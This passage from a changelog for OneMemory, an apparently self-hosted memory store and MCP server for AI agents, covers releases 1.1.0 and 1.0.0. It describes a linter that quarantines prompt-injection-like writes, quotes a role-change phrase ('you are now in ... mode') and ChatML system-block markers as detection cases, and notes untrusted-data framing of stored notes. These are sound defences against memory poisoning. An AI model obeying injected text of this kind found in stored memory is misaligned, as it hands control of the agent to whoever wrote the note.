  old `updated_at`, deletes, and writes by other processes are all
  captured. Read scope, namespace-gated like `/search`. See
  `docs/change-feed.md`.
- **Write-time memory linter** — every create/update/import is scanned for
  secrets and prompt-injection instructions. Policy via `ONEMEMORY_LINT`
  (`block` | `quarantine` | `warn`, or per category); default
  `secrets=block,injection=quarantine`. Quarantined writes are held in their
  own table (never notes, so never searchable or recalled) until an admin
  approves or rejects them: MCP `memory_quarantine` (admin), CLI
  `onememory quarantine`. See `docs/memory-linter.md`.
- **Plain-file sync** — `onememory export --format md --dir <path>` (one
  Markdown file per note, YAML front-matter, namespace folders,
  deterministic, prunes only its own files; `--format json` for a JSON
  backup) and `onememory import --dir <path> [--dry-run]` (three-way merge
  against a per-store sync base; newer side wins on conflict, the loser is
  saved under `.conflicts/`; cross-machine identity via a store UUID). See
  `docs/file-sync.md`.
- **Session recall hook** — `onememory recall` (Claude Code SessionStart),
  fail-silent with a hard timeout.
- **Server-side namespace resolution** (opt-in, `ONEMEMORY_SPACES` /
  `~/.onememory/spaces.json`): the model-supplied `namespace` becomes an untrusted
  hint; writes land in the resolved namespace, reads are limited to it plus
  one-directional `reads_from` grants.
- **Natural-language time filter** — `when` on `state_search` / `GET
  /search` ("yesterday evening", "last week", "Oct 14").
- **Consolidation** — `memory_consolidation_candidates`,
  `memory_consolidate` (dry-run, keep-sources), CLI `consolidate`, optional
  background janitor (`ONEMEMORY_AUTO_CONSOLIDATE_INTERVAL`).
- **Similarity edge graph** — same-namespace TF-IDF edges maintained on
  every write; `state_read` `neighbors: true`; `memory_rebuild_edges`,
  `POST /rebuild-edges`, CLI `rebuild-edges`.
- **Access tracking** — `access_count` / `last_accessed`, `memory_stats` /
  `GET /stats`.
- **Staleness** — stale/ageDays/staleWarning on read and search results
  (`ONEMEMORY_STALE_DAYS`, `ONEMEMORY_STALE_TAGS`, `ONEMEMORY_STALE_TAG_DAYS`).
- **`state_relevant` / `POST /relevant`** — keyword extraction from a
  conversational message with permissive OR matching.
- Signed command runner — **repo-only**: run it from a git checkout; it is
  not in the npm package (see `docs/RUNNER.md`).
- `ONEMEMORY_ACCESS_BOOST=0` turns off the access-boost + staleness
  re-rank (see Behavior changes).

### Behavior changes

- **The secret scanner is broader** (JWTs, Stripe keys, `github_pat_`, any
  PEM private-key block, `ASIA` AWS keys, high-entropy tokens) and now also
  scans tags. A write that 1.0.0 accepted can now be refused; set
  `ONEMEMORY_LINT=secrets=warn` to store with a warning instead.
- **Prompt-injection-like writes are quarantined by default.**
  `POST /notes` / `PUT /notes/:id` answer `202 { quarantined }` and
  `state_write` returns `{ quarantined }` (not an error) instead of storing.
  Set `ONEMEMORY_LINT=injection=warn` for the 1.0 behavior plus warnings.
- Write responses may carry an additive `warnings` array; `POST /import` may
  carry additive `quarantined` / `rejected` arrays. Existing fields are
  unchanged.

- **Search ranking** now multiplies native relevance by a recency-decayed
  access boost and a graded staleness penalty, so result order can differ
  from 1.0.0. Set `ONEMEMORY_ACCESS_BOOST=0` to rank by native relevance
  only (FTS bm25 / cosine / RRF), as in 1.0.0.
- **`memory_consolidation_candidates` requires the `admin` scope** (was
  `read`): one call is an O(n²) scan. It also runs one at a time
  (a concurrent call gets an error), stops after a 15 s budget or when the
  client disconnects/cancels, and scans at most 2,000 notes **and** ~2 MB
  of text (newest first).
- **`POST /rebuild-edges`** has the same confirmation gate as the MCP tool:
  above 2,000 notes in scope it answers `409` with `{ notes, pairs }`
  unless the body has `confirm: true`. A rebuild while another is running
  answers `409` (MCP: error result).
- **Time phrases default to the host's timezone** when
  `ONEMEMORY_TIMEZONE` is unset (was UTC).
- **`/import` restores `created_at` / `updated_at`** from the backup
  (valid dates only, normalized to UTC ISO); restored notes no longer look
  brand new.
- **Namespace path matching** is case-insensitive on Windows and macOS and
  compares real paths (symlinks resolved) when the directory exists.

### Fixed

- Change-feed cursors are HMAC-signed with a per-store key and bound to the
  filter they were issued for; "last" markers are keyed by the server
  (`changes_seen:` prefix only), consumer labels are validated, and at most
  256 markers are kept. (A 1.1.0-rc cursor could be edited to overwrite any
  `_meta` key, e.g. `store_uuid` or `edge_threshold`, with a read token.)
- Approving a quarantined update is pinned to the note revision it was held
  at — an edit in between makes approval a conflict instead of a silent
  overwrite — and it moves the note only if the original write named a
  namespace.
- Similarity-index memory is bounded: per-namespace indexes are released
  when idle or least-recently-used beyond a note budget
  (`ONEMEMORY_EDGE_INDEX_IDLE_MS`, `ONEMEMORY_EDGE_INDEX_MAX_NOTES`).
- Reads no longer write: access counters are buffered and flushed in one
  transaction every `ONEMEMORY_ACCESS_FLUSH_MS` (default 5 s) and on
  shutdown, so searches stop invalidating other processes' caches.
- The CLI and servers no longer print Node's `ExperimentalWarning: SQLite`
  line (only that warning is filtered).
- `onememory init` prints `onememory mcp` instead of an absolute path into
  the package; `onememory start` prints the token file and a sample `curl`.

- **Write latency no longer grows with the namespace.** Edge scoring used
  to re-select and re-tokenize every note in the namespace on each
  create/update (≈70–110 ms per write at 2,000 notes, growing linearly).
  A per-namespace inverted index (cached term frequencies, kept in sync
  incrementally and across connections via `PRAGMA data_version`) scores
  only notes that share tokens with the written one, capped at the 256
  strongest candidates: ≈5 ms per write at 2,000 notes. Scores are
  identical to the exhaustive scan below the cap.
- **Import no longer triggers a full-store rebuild.** A 1-note import into
  a 2,000-note store took ~23 s (20,000 notes: minutes) and bypassed the
  rebuild confirmation gate; only the imported notes are now scored against
  their namespace (≈5 ms at 2,000 notes).
- `state_list` / `GET /notes` across readable namespaces (namespace
  resolution) capped each namespace at 500 notes, reported a wrong `total`
  and returned empty pages past 500; they now page in SQL.
- Rebuilds are single-flight per process, and a note updated or deleted
  while a rebuild is scoring keeps its fresh edges (the rebuild skips notes
  whose revision moved since its snapshot, and loads each namespace right
  before wiping it).

### Release-candidate review fixes

- **Multi-process writes**: `create()` takes the write lock up front
  (`BEGIN IMMEDIATE`) for the note and its edges; it no longer fails with
  "database is locked" after the note was already saved (which duplicated
  notes on retry).
- **Upgrade from 1.0.x via `npm install -g`** keeps your data (`preinstall`
  rescue, see Upgrade notes). Concurrent first starts can't swap the
  migrated database under each other (lock file + non-replacing link).
- **File sync**: deleting a note imported from another machine is
  remembered; the next import skips it instead of re-creating it (export
  prunes the unedited file). Writes re-check the real path inside the sync
  folder right before write/rename/delete.
- **Linter**: "you are now in maintenance/dark/airplane mode" and docs that
  mention ChatML / `[INST]` in prose or inline code are no longer
  quarantined; real `<|im_start|>system` blocks still are. Scan
  normalization drops Default_Ignorable characters (variation selectors,
  Hangul fillers, U+034F) and folds Cyrillic/Greek look-alike letters.
- **Change feed**: deleting a note blanks its titles in the change log and
  renaming keeps only the latest title; `onememory changes --purge` empties
  the log. `last` markers are evicted least-recently-read first and only
  after 7 days unread; a `last` read with no marker returns
  `markerReset: true`.
- A port already in use prints which port and which variable
  (`ONEMEMORY_PORT` / `ONEMEMORY_MCP_PORT`) to change, and exits 1.
- Quarantined updates from before rev tracking (`if_rev` NULL) are refused
  on approval with a "reject and re-submit" error instead of being applied
  unguarded.
- Data directory and files are owner-only (see Upgrade notes).

### Tier 2 review fixes — Database + Search/IR (HIGH/MEDIUM)

- **Edge metric is now TF-IDF cosine** (was raw-TF cosine): rare shared terms
  count more than corpus-wide boilerplate, and pairs sharing fewer than 2
  content tokens never earn an edge (minimum-support floor). The old 0.35
  floor was cargo-culted from llmem's BM25-based scale and let single-token
  overlaps ("Dentist appointment" vs "see dentist thursday" scored 0.408)
  create junk edges.
- **Edge threshold re-tuned to 0.25** by sweeping 0.15–0.60 on 150 hand-labeled
  note pairs (dataset and script in the project history, under `reviews/tier2-threshold-sweep/`): F1 peaks
  at 0.851 on the 0.15–0.25 plateau (P 0.863, R 0.840); 0.25 is the top of the
  plateau, chosen to favor precision. 12/75 positives are unreachable by any
  token metric (no shared content tokens) — the documented recall ceiling.
- **Active edge threshold persisted** in the `_meta` table (created by
  migration v5; v6 adds the edge indexes below):
  `Store.getEdgeThreshold()` / `setEdgeThreshold()`;
  `create()`, `update()`, `consolidateNotes()` and `rebuildEdgesCooperative()`
  all read it, and an explicit rebuild threshold is persisted — no more
  mixed-threshold graphs.
- **`create()` edge computation is atomic** via `SAVEPOINT`/`RELEASE` (nests
  safely inside `consolidateNotes`' transaction): a crash mid-loop can no
  longer leave a partial edge set.
- **`importNotes()` is now async**: per-note edge scoring is skipped
  during the inserts (`create(..., { skipEdges: true })`) and the imported
  notes are linked afterwards (since 1.1.0: only the imported notes, never
  a whole-store rebuild).
- **Access boost is recency-aware**: `1 + 0.1·log10(1+c)·exp(-days/30)` — old
  popularity decays unless the note was actually re-read recently
  (`last_accessed`, previously tracked but unused in ranking, is now the
  decay signal). The flat 0.9 staleness penalty was arithmetically erased at
  ≥10 accesses; the penalty is now graded, 0.95 per 90-day age band
  (`stalePenaltyFactor()` in `staleness.ts`; `STALE_SCORE_PENALTY` kept
  exported for compatibility).
- **New indexes** (migration v6): `idx_note_edges_neighbor` fixes the
  O(E) reverse-direction edge `DELETE`; composite `(note_id, score DESC)`
  covers the neighbor query's `WHERE` + `ORDER BY`.
- Term-frequency maps are precomputed once per note via the shared
  `precomputeTfMaps()` helper — the tokenizer no longer runs inside any
  pair loop.

## [OneMemory 1.0.0] — 2026-10-15

First public version.

### Core
- SQLite note store (`node:sqlite`, no native modules) with FTS5 full-text
  search kept in sync by triggers; namespaces, tags, pagination, note
  revisions (compare-and-swap), provenance, and export/import.
- MCP server over stdio and MCP-over-HTTP (Streamable HTTP), plus a plain REST
  API and a small dashboard. `start` runs the REST API/dashboard **and** the
  MCP-over-HTTP endpoint in one process on a shared store.
- Scoped tokens: `read` / `write` / `admin`, via `ONEMEMORY_TOKENS` (JSON) or
  `data/tokens.json` (1.1.0: `~/.onememory/tokens.json`), enforced identically on the REST API and MCP tools.
- Optional semantic search (keyword / semantic / hybrid) using your own
  OpenAI-compatible or Ollama embeddings endpoint; off by default, with a
  `reindex` CLI command. Degrades to keyword search if the endpoint is down.
- One-command self-host: `Dockerfile` + `docker-compose.yml` (non-root user,
  `/ready` health check).
- CLI: `start`, `mcp`, `doctor`, `init`, `reindex`.
- `/health` (liveness) and `/ready` (touches the DB) endpoints.
- Docs: install for every MCP client, Cloudflare Access / tunnel setup, and
  "Use with n8n" in `INFRA.md`.

### Security
- Localhost-by-default / fail-closed exposure guard, bearer auth with
  constant-time (SHA-256 + `timingSafeEqual`) compare, DNS-rebinding Origin
  check (loopback + explicit allowlist, does not trust `Origin == Host`),
  per-client rate limiting (`x-forwarded-for` / `cf-connecting-ip` trusted only
  behind an opt-in flag), secret-scan-on-write (title/body/source),
  untrusted-data framing on read, request/response size caps, append-only audit
  log that records operations but never note content.

### Hardened per two rounds of external review
- Compare-and-swap is a single atomic `UPDATE` in a transaction (holds across
  connections/processes, not just in-process).
- Imported notes are embedded for semantic search; import is best-effort
  per-note (a bad note is skipped, not a half-committed batch).
- `/export` is exempt from the response-size cap so a grown store can still be
  backed up; the cap still applies to every other route.
- Oversized request bodies return `413` and malformed JSON `400` consistently
  on both the REST and MCP-over-HTTP front doors (shared body reader).
- MCP tools return a generic error for unexpected faults (no `node:sqlite`
  internals leaked); dashboard output is HTML-escaped under a CSP + `nosniff`.
- `/ready` is behind the rate limiter; rate-limiter memory is hard-bounded.
- Full test suite (154 tests) green on Node 24; 0 production dependency
  vulnerabilities (`npm audit`).
